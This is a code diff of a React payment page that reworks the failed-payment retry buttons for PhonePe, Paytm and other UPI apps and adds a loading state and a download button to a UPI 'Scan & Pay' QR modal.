+              <p className="text-[12px] text-amber-900 font-medium leading-relaxed m-0">
+                Don&apos;t worry, your money will refund within <strong>1-2 hours</strong> if debited from your account.
+              </p>
+            </div>
+
+            {/* Action Buttons */}
+            <div className="flex flex-col gap-2.5">
+              {/* Primary: Retry Payment Through Other App */}
+              <button
+                onClick={handleRetryOtherApp}
+                className="w-full py-3 bg-[#2874f0] hover:bg-[#1259d6] active:scale-[0.98] text-white font-bold rounded-xl text-[14px] transition shadow flex items-center justify-center gap-2"
+              >
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+                  <path d="M21 2v6h-6"></path>
+                  <path d="M3 12a9 9 0 0 1 15-6.7L21 8"></path>
+                  <path d="M3 22v-6h6"></path>
+                  <path d="M21 12a9 9 0 0 1-15 6.7L3 16"></path>
+                </svg>
+                Retry Payment Through Other App
+              </button>
+
+              {/* Quick direct buttons for remaining 3 apps */}
+              <div className="grid grid-cols-3 gap-1.5 mt-0.5">
+                <button
+                  onClick={() => {
+                    setIsFailed(false);
+                    setSelectedMethod('phonepe');
+                    payNow('phonepe');
+                  }}
+                  className={`py-2 px-1 border rounded-lg text-xs font-semibold flex items-center justify-center gap-1 transition ${selectedMethod === 'phonepe' ? 'border-blue-500 bg-blue-50/60 text-blue-700 font-bold' : 'border-gray-200 bg-gray-50 hover:bg-gray-100 text-gray-700'}`}
+                >
+                  <img src="/assets/images/phonepe.svg" className="w-4 h-4 object-contain" alt="" />
+                  <span>PhonePe</span>
+                </button>
+
+                <button
+                  onClick={() => {
+                    setIsFailed(false);
+                    setSelectedMethod('paytm');
+                    payNow('paytm');
+                  }}
+                  className={`py-2 px-1 border rounded-lg text-xs font-semibold flex items-center justify-center gap-1 transition ${selectedMethod === 'paytm' ? 'border-blue-500 bg-blue-50/60 text-blue-700 font-bold' : 'border-gray-200 bg-gray-50 hover:bg-gray-100 text-gray-700'}`}
+                >
+                  <img src="/assets/images/paytm_icon.svg" className="w-4 h-4 object-contain" alt="" />
+                  <span>Paytm</span>
+                </button>
+
+                <button
+                  onClick={() => {
+                    setIsFailed(false);
+                    setSelectedMethod('other_upi');
+                    payNow('other_upi');
+                  }}
+                  className={`py-2 px-1 border rounded-lg text-xs font-semibold flex items-center justify-center gap-1 transition ${selectedMethod === 'other_upi' ? 'border-blue-500 bg-blue-50/60 text-blue-700 font-bold' : 'border-gray-200 bg-gray-50 hover:bg-gray-100 text-gray-700'}`}
+                >
+                  <img src="/assets/images/upi.svg" className="w-4 h-4 object-contain" alt="" />
+                  <span>Other UPI</span>
+                </button>
+              </div>
+
+              {/* Retry with Same App */}
               <button
                 onClick={() => {
                   setIsFailed(false);
-                  payNow();
+                  payNow(selectedMethod);
                 }}
-                className="w-full py-2.5 bg-[#fb641b] hover:bg-[#e85a16] text-white font-bold rounded-lg text-sm transition shadow"
+                className="w-full py-1.5 text-xs text-gray-500 hover:text-gray-800 font-semibold transition"
               >
-                Retry Payment
-              </button>
-              <button
-                onClick={() => setIsFailed(false)}
-                className="w-full py-2 text-gray-600 hover:text-gray-800 font-semibold text-xs transition"
-              >
-                Choose Another Method
+                Retry with same app ({
+                  selectedMethod === 'phonepe' ? 'PhonePe' :
+                  selectedMethod === 'paytm' ? 'Paytm' :
+                  selectedMethod === 'other_upi' ? 'Other UPI' : 'Same App'
+                })
               </button>
             </div>
           </div>
@@ -869,13 +1351,22 @@ function PaymentContent() {
 
       {/* QR Code Modal (Scan & Pay) */}
       {showQR && (
-        <div id="qrModal" className="fixed inset-0 z-50 flex items-center justify-center p-4">
+        <div
+          id="qrModal"
+          className="fixed inset-0 z-[70] flex items-center justify-center p-4"
+          style={{ zIndex: 9999 }}
+        >
           <div className="bg-white rounded-2xl w-[90%] max-w-[340px] overflow-hidden text-center relative shadow-2xl">
             <div className="bg-blue-600 text-white p-4 flex items-center gap-4">
-              <button onClick={() => setShowQR(false)}>
+              <button
+                type="button"
+                onClick={() => setShowQR(false)}
+                className="text-white hover:opacity-80 p-1"
+                aria-label="Close"
+              >
                 <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M19 12H5M12 19l-7-7 7-7"></path></svg>
               </button>
-              <h3 className="font-semibold text-lg m-0">Scan & Pay</h3>
+              <h3 className="font-semibold text-lg m-0 text-white">Scan & Pay</h3>
             </div>
             <div className="p-6 bg-blue-50/50">
               <div className="text-xs font-semibold text-gray-700 uppercase tracking-wider mb-2">{MERCHANT_NAME}</div>
@@ -884,16 +1375,72 @@ function PaymentContent() {
                   COD Shipping Charge
                 </div>
               )}
-              <div id="qr-box" className="bg-white p-4 rounded-xl inline-block shadow-sm mb-4">
-                <img
-                  src={qrCodeDataUrl || `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(`upi://pay?pa=${upiId}&pn=${encodeURIComponent(payeeName)}&am=${itemData.selling_price}&cu=INR`)}`}
-                  alt="QR Code"
-                  width="180"
-                  height="180"
-                  className="mx-auto"
-                />
+
+              {/* QR Container / Loading Box */}
+              <div
+                id="qr-box"
+                className="bg-white p-4 rounded-2xl shadow-sm mb-3 mx-auto flex items-center justify-center min-h-[220px] min-w-[220px] max-w-[220px] border border-blue-100/70 relative"
+              >
+                {isQrLoading ? (
+                  <div className="flex flex-col items-center justify-center py-6 px-2 text-center">
+                    {/* Animated Loading Spinner & QR Icon */}
+                    <div className="relative w-14 h-14 mb-3 flex items-center justify-center">
+                      <div className="absolute inset-0 border-3 border-blue-100 border-t-blue-600 rounded-full animate-spin"></div>
+                      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#2563eb" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
+                        <rect x="3" y="3" width="7" height="7"></rect>
+                        <rect x="14" y="3" width="7" height="7"></rect>
+                        <rect x="14" y="14" width="7" height="7"></rect>
+                        <rect x="3" y="14" width="7" height="7"></rect>
+                      </svg>
+                    </div>
+                    <span className="text-[13px] font-bold text-gray-800 mb-1">Generating QR Code...</span>
+                    <span className="text-[11px] text-gray-400">NPCI compliant format</span>
+                  </div>
+                ) : (
+                  <div className="flex flex-col items-center">
+                    <img
+                      src={qrCodeDataUrl}
+                      alt="UPI QR Code"
+                      width="190"
+                      height="190"
+                      className="mx-auto block rounded-lg transition-opacity duration-300"
+                    />
+                  </div>
+                )}
               </div>
-              <div id="qr-amount-show" className="font-bold text-[22px] text-blue-600 mb-3">{qrAmountShow}</div>
+
+              <div id="qr-amount-show" className="font-bold text-[22px] text-blue-600 mb-3">
+                {qrAmountShow || `₹${formatINR(itemData.selling_price)}`}
+              </div>
+
+              {/* Download QR Code button */}
+              <button
+                type="button"
+                onClick={downloadQRCode}
+                disabled={isQrLoading || !qrCodeDataUrl}
+                className={`w-full mb-3 py-2.5 font-bold rounded-xl text-sm shadow-sm transition flex items-center justify-center gap-2 ${
+                  isQrLoading || !qrCodeDataUrl
+                    ? "bg-gray-100 text-gray-400 border-2 border-gray-200 cursor-not-allowed opacity-80"
+                    : "bg-white border-2 border-blue-600 text-blue-600 hover:bg-blue-50 active:scale-[0.98] cursor-pointer"
+                }`}
+              >
+                {isQrLoading ? (
+                  <>
+                    <div className="w-4 h-4 border-2 border-gray-400 border-t-transparent rounded-full animate-spin"></div>
+                    <span>Generating QR...</span>
+                  </>
+                ) : (
+                  <>
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+                      <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                      <polyline points="7 10 12 15 17 10"></polyline>
+                      <line x1="12" y1="15" x2="12" y2="3"></line>
+                    </svg>
+                    <span>Download QR Code</span>
+                  </>
+                )}
+              </button>
+
               <div className="flex justify-center gap-4 opacity-80 mb-4">
                 <img src="/assets/images/phonepe.svg" width="28" alt="PhonePe" />
                 <img src="/assets/images/paytm_icon.svg" width="28" alt="Paytm" />
